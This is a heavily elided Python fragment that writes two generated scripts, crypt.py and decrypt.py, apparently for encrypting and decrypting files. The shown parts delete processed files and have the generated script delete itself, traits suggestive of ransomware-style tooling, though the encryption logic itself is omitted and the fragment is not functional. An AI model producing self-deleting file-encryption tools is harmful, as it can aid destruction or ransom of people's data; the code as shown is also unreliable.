...
with open("crypt.py", "w") as crypt:
    crypt.write('''#!/usr/bin/env python3.5
import os, sys
...
with open("decrypt.py", "w") as decrypt:
    decrypt.write('''#!/usr/bin/env python3.5
import os, sys
...
def decrypt(file):
    ...
    print("[decrypted] '" + str(os.path.splitext(file)[0]) + ".crp'")
    os.remove(file)
...
os.remove(str(sys.argv[0]))
''')
    print("[+] File 'decrypto.py' successfully saved!")
print("-------------------------------------")